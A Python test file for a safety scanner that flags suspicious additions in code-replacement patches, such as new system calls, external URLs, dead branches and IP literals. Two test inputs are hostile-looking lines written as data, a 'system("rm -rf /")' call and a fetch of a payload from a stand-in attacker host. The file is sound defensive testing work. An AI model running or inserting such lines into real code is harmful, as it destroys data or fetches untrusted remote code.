from fixme.safety import scan_replace_block


def test_clean_replace_passes():
    original = "    int x = compute(y);"
    replaced = "    int x = (y > 0) ? compute(y) : 0;"
    assert scan_replace_block(replaced, original) == []


def test_detects_new_system_call():
    original = "    int x = 0;"
    replaced = '    system("rm -rf /");'
    assert "system_call" in scan_replace_block(replaced, original)


def test_preexisting_system_call_ignored():
    original = '    system("ls");'
    replaced = '    system("ls");\n    int x = 0;'
    assert "system_call" not in scan_replace_block(replaced, original)


def test_detects_external_url():
    original = "    int x = 0;"
    replaced = '    fetch("https://evil.example.com/payload");'
    assert "external_url" in scan_replace_block(replaced, original)


def test_localhost_url_allowed():
    original = "    int x = 0;"
    replaced = '    fetch("http://localhost:8080/api");'
    assert "external_url" not in scan_replace_block(replaced, original)


def test_detects_dead_branch():
    original = "    if (cond) { return 0; }"
    replaced = "    if (0) { return 0; }"
    assert "dead_branch" in scan_replace_block(replaced, original)


def test_detects_external_ip():
    original = "    int x = 0;"
    replaced = '    connect("192.168.1.1");'
    assert "ip_literal" in scan_replace_block(replaced, original)
